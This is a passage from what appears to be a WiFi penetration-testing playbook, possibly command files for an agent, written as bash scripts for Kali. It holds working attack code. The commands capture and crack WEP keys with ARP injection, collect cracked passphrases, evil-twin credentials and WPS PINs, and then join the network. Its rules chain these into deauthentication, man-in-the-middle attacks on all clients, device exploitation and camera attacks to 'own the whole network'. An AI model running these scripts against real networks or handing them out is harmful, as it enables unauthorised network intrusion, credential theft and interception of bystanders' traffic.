    -w "$ENG/loot/wifi/wep_capture" \
    --output-format pcap "$MON_IFACE" 2>/dev/null &
AIRODUMP_PID=$!

sleep 5

# Inject ARP packets to accelerate IV collection
echo "Injecting ARP packets to accelerate IV collection..."
aireplay-ng -3 -b "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null &
INJECT_PID=$!

# Wait for enough IVs (at least 50k for 64-bit WEP, 200k for 128-bit)
echo "Collecting IVs... (will attempt crack after 30 seconds)"
sleep 30

# Crack
echo ""
echo "Attempting WEP crack..."
aircrack-ng "$ENG/loot/wifi/wep_capture"*.cap 2>/dev/null | \
    grep -E "KEY FOUND|key\|attempt|IVs" | head -10

kill $AIRODUMP_PID $INJECT_PID 2>/dev/null
```

---

## Phase 9 — Results & Next Steps

```bash
ENG=/home/kali/current

echo ""
echo "=== WiFi Attack Results ==="
echo ""

echo "--- Cracked passwords ---"
find $ENG/loot/wifi/ -name "cracked_*.txt" -exec cat {} \; 2>/dev/null | head -20

echo ""
echo "--- Evil twin credentials ---"
cat $ENG/loot/wifi/evil_twin_creds.txt 2>/dev/null | head -10

echo ""
echo "--- WPS PINs / PSKs ---"
grep -iE "PSK|PIN|Password" $ENG/loot/wifi/wps_reaver.txt 2>/dev/null | head -10

echo ""
echo "=== Next Steps After PSK Recovery ==="
PSK=$(find $ENG/loot/wifi/ -name "cracked_*.txt" -exec cat {} \; 2>/dev/null | awk -F: '{print $NF}' | head -1)
[ -n "$PSK" ] && {
    echo "  [+] WiFi PSK recovered: $PSK"
    echo "  → Connect Kali to the network:"
    echo "    wpa_passphrase $TARGET_ESSID '$PSK' > /tmp/wpa.conf"
    echo "    wpa_supplicant -B -i $WLAN -c /tmp/wpa.conf"
    echo "    dhclient $WLAN"
    echo "  → Scan the internal network: /pt-net $WLAN"
    echo "  → MITM all clients: /pt-mitm $WLAN"
    echo "  → Exploit devices: /pt-exploit <host>"
    echo "  → Attack cameras: /pt-iot <subnet>"
}

# Save engagement notes
cat >> $ENG/notes/engagement.md << EOF

---
## WiFi Attack Results
**Date**: $(date)
**Target SSID**: $TARGET_ESSID
**BSSID**: $TARGET_BSSID
**PSK**: $(find $ENG/loot/wifi/ -name "cracked_*.txt" -exec cat {} \; 2>/dev/null | awk -F: '{print $NF}' | head -1 || echo "not cracked")
**Method**: PMKID / Handshake / WPS / Evil Twin
EOF
```

---

## Execution Rules

- **PMKID first** (Phase 4a) — passive, no alerts, works without clients
- **Handshake second** (Phase 4b) — if PMKID fails, deauth 1 client (not broadcast)
- **WPS check always** (Phase 6) — many routers are still vulnerable
- **Evil twin** (Phase 7) — when cracking fails, social engineering works
- **After PSK cracked** → connect → `/pt-net` → `/pt-mitm` → own the whole network
- **Restore interface** when done: `airmon-ng stop $MON_IFACE; nmcli radio wifi on`
